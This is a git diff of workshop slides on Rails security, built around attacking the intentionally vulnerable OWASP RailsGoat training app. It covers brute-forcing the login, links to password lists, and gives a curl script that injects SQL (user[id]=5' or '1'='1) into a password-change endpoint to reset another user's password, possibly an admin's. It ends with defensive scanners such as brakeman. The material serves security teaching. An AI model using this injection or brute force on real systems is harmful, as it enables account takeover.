@@ -1,3 +1,4 @@
+
 # Rails security in 20 minutes.
 
 Lišák a Vráťa
@@ -77,4 +78,78 @@ If you cannot knock, you can go here https://railsgoat.fqdn.cz/ and open firewal
 
 # Your first task is to log in.
 
-- 
+Bruteforce FTW!
+
+There are many tools, but we wrote one specially for this event and for bruteforcing rails app. Old tools do not know about _CSRF token_ :-).
+
+===
+# Half of the kingdom for good password list.
+
+Apparently, most search engine results for "top 1000 passwords" goes to fancy html pages.
+
+Good lists are here:
+https://github.com/danielmiessler/SecLists/tree/master/Passwords
+
+
+# We are in - lets look around.
+
+- demo time
+
+# Low hanging fruit.
+
+Those were examples of low hanging fruit. There are more complicated things.
+
+Luckily, there is Perfect Tutorial:
+
+https://github.com/OWASP/railsgoat/wiki/Rails-5-Tutorials
+
+# SQL injection
+
+Badly implemented password change API endpoint. 
+Often the first account is admin :-)
+
+```bash
+base=http://localhost:3000/
+user=jim@metacorp.com
+pass=alohaowasp
+
+newpass=Password1
+
+curlcmd='curl -b cookies.txt --cookie-jar cookies.txt'
+token=$($curlcmd "${base}"| grep -i token | sed -e 's/^.*value=//' | cut -d '"' -f 2)
+
+$curlcmd -X POST -d "authenticity_token=${token}" -d email=$user \
+ -d password=$pass "${base}/sessions"
+ 
+$curlcmd -X POST \
+  -d "user[id]=5' or '1'='1" \
+  -d user[password]=$newpass \
+  -d user[password_confirmation]=$newpass \
+  -d _method=put "${base}/users/5.json"
+```
+
+===
+
+# demo sqli
+
+- cheat and show log output in console
+
+
+# Stop hacking now, enter The Blue Team
+
+or
+
+# How can computer help me with rails security?
+
+- a lot.
+
+===
+
+# Tools to cover
+
+- `rubocop` - common "lint" for ruby/rails
+- `bundler audit` - checks your dependencies 
+- `brakeman`  - check for common vulnerabilities
+- `danger`  - insecure files in git - keys, credentials
+
+
